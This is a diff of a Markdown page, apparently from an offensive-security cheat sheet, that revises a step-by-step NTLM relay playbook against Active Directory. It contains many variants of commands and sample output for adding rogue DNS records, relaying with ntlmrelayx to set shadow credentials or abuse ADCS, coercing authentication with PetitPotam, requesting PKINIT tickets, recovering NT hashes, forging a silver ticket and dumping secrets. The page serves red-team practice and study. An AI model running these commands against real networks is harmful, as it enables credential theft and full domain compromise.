@@ -1,9 +1,11 @@
 ---
 title: "NTLM Relay Attack"
-tags: ["Shadow Credential", "NTLM", "LDAP", "Pass-The-Hash", "Impacket", "NTLM Replay", "Petitpotam", "Active Directory", "Windows", "ADCS", "WebDAV", "Pkinit", "Ticket Granting Ticket"]
+tags: ["Active Directory", "NTLM Relay Attack", "ADCS", "Impacket", "LDAP", "NTLM", "NTLM Replay", "Pass-The-Hash", "Petitpotam", "Pkinit", "Shadow Credential", "Ticket Granting Ticket", "WebDAV", "Windows"]
 ---
 
-### Abuse #1: Shadow Credential
+{{< filter_buttons >}}
+
+### Shadow Credential
 
 #### 1. Redirect Traffic (Pivoting Node) \[Optional\]
 
@@ -42,7 +44,7 @@ net use x: http://<LOCAL_IP>/
 
 ```console
 # Check
-./GetWebDAVStatus.exe <TARGET_DOMAIN>
+./GetWebDAVStatus.exe <TARGET>
 ```
 
 ```console {class="sample-code"}
@@ -58,12 +60,69 @@ net use x: http://<LOCAL_IP>/
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-```console
-python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r <SUBDOMAIN>.<DOMAIN> -d <LOCAL_IP> --action add <DC_IP>
+```console {class="password"}
+# Password
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ python dnstool.py -u 'example.com\apple.seed' -p 'P@ssw0rd123' -r test.example.com -d 10.8.7.13 --action add 10.10.143.101    
+$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+```console {class="ntlm"}
+# NTLM
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
+```
+
+```console {class="sample-code"}
+$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' --action add --record test.example.com --data 10.10.14.31 10.10.143.102
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
+```
+
+```console {class="sample-code"}
+$ python3 dnstool.py -u 'example.com\apple.seed' -p 'Password123!' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+python3 dnstool.py -u '<DOMAIN>\<USER>' -p ':<HASH>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
+```
+
+```console {class="sample-code"}
+$ python3 dnstool.py -u 'example.com\apple.seed' -p ':2B576ACBE6BCFDA7294D6BD18041B8FE' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+python3 dnstool.py -u '<DOMAIN>\<USER>' -k --action add --record <SUBDOMAIN>.<DOMAIN> --data <LOCAL_IP> <DC_IP>
+```
+
+```console {class="sample-code"}
+$ python3 dnstool.py -u 'example.com\apple.seed' -k --action add --record test.example.com --data 10.10.14.31 10.10.143.102
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
@@ -105,35 +164,8 @@ sudo responder -I tun0 -w -d -v
 
 #### 5. Start NTLM Relay Server (Local Linux)
 
-#### Get Latest Impacket
-
 ```console
-git clone https://github.com/fortra/impacket.git
-```
-
-```console
-cd impacket
-```
-
-```console
-python3 -m venv venv
-```
-
-```console
-source venv/bin/activate
-```
-
-```console
-pip3 install .
-```
-
-```console
-pip3 install impacket pyOpenSSL==24.0.0
-```
-
-#### Run ntlmrelayx
-
-```console
+# Get latest impacket
 python3 examples/ntlmrelayx.py -t ldaps://<DC_IP> -smb2support --adcs --shadow-credentials --shadow-target '<TARGET_HOSTNAME>$' 
 ```
 
@@ -169,52 +201,75 @@ Impacket v0.13.0.dev0+20250814.3907.9282c9bb - Copyright Fortra, LLC and its aff
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-```console
-python3 PetitPotam.py -u '<USER>@<DOMAIN>' -hashes :<HASH> <RESPONDER_MACHINE_NAME>@80/test <LOCAL_IP> -pipe all
+```console {class="password"}
+# Password
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
 ```
 
 ```console {class="sample-code"}
-python3 PetitPotam.py -u "test.user@example.com" -hashes ":7ddf32e17a6ac5ce04a8ecbf782ca509" ms01@8090/test 192.168.100.101 -pipe all
-
-                                                                                               
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
-
-
-
-Trying pipe efsr
-[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
-Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
-Trying pipe lsarpc
-[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
-[+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
-[+] OK! Using unpatched function!
-[-] Sending EfsRpcEncryptFileSrv!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
----[SNIP]---
+$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
+SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
+COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
 ```
 
-<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
+```
+
+```console {class="sample-code"}
+$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
+SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
+```
+
+```console {class="sample-code"}
+$ nxc smb WS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
+SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:Password123!
+COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
+```
+
+```console {class="sample-code"}
+$ nxc smb WS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -k --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
+SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+SMB         10.10.143.102   445    WS01             [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc smb <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M coerce_plus -o LISTENER=<SUBDOMAIN>@80/test METHOD=PetitPotam
+```
+
+```console {class="sample-code"}
+$ nxc smb WS01.example.com -u 'apple.seed' -d example.com -k --use-kcache --kdcHost dc01.example.com -M coerce_plus -o LISTENER=test@80/test METHOD=PetitPotam
+SMB         10.10.143.102   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:example.com) (signing:False) (SMBv1:False)
+COERCE_PLUS 10.10.143.102   445    WS01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.10.143.102   445    WS01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+```
 
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
 ```console
-./SpoolSample.exe <TARGET_DOMAIN> <RESPONDER_MACHINE_NAME>@80/test
+./SpoolSample.exe <TARGET> <SUBDOMAIN>@80/test
 ```
 
 {{< /tabcontent >}}
@@ -222,7 +277,7 @@ Trying pipe lsarpc
 #### 7. Request TGT Using pfx File (Local Linux)
 
 ```console
-# Request a TGT
+# Cert-based Kerberos
 python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_PASSWORD> -dc-ip <DC_IP>
 ```
 
@@ -250,11 +305,12 @@ nxc smb <DC> --use-kcache
 #### 8. Get NTLM Hash (Local Linux)
 
 ```console
-# Import ticket
+# Pass-the-ticket
 export KRB5CCNAME='<TARGET_HOSTNAME>.ccache'
 ```
 
 ```console
+# Ticket-based Kerberos
 python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
 ```
 
@@ -268,27 +324,28 @@ Recovered NT Hash
 59920e994636168744039017dcf49e54
 ```
 
-#### 9. Get Silver Ticket
+#### 9. Forge a Silver Ticket
 
 ```console
-impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn anything/<TARGET_DOMAIN> administrator
+# NTLM
+impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC_IP> -spn <SPN> administrator
 ```
 
 #### 10. Secrets Dump
 
 ```console
-# Import ticket
+# Pass-the-ticket
 export KRB5CCNAME='administrator.ccache'
 ```
 
 ```console
 # Secrets dump
-impacket-secretsdump -k -no-pass <TARGET_DOMAIN>
+impacket-secretsdump -k -no-pass <TARGET>
 ```
 
 ---
 
-### Abuse #2: Abusing Active Directory Certificate Services
+### Abusing Active Directory Certificate Services (ADCS)
 
 #### 1. Run socat to Redirect Traffic (Inside Pivoting Node) \[Optional\]
 
@@ -317,17 +374,39 @@ python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --
 
 #### 5. Run PetitPotam
 
-```console
-proxychains4 -q python3 PetitPotam.py -u '<UESR>' -p '<PASSWORD>' -d <DOMAIN> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```console {class="password"}
+# Password
+python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -p '<PASSWORD>' '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
-#### 6. Request a TGT Using pfx file
+```console {class="ntlm"}
+# NTLM
+python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -hashes :<HASH> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -p '<PASSWORD>' -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -hashes :<HASH> -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -k -no-pass -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+```
+
+#### 6. Request a Ticket Using pfx file
 
 ```console
+# Cert-based Kerberos
 python3 gettgtpkinit.py -cert-pfx '<TARGET_HOSTNAME>$.pfx' '<DOMAIN>/<TARGET_HOSTNAME>$' '<TARGET_HOSTNAME>$.ccache'
 ```
 
-#### 7. Get NT Hash
+#### 7. Get NTLM Hash
 
 ```console
 python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
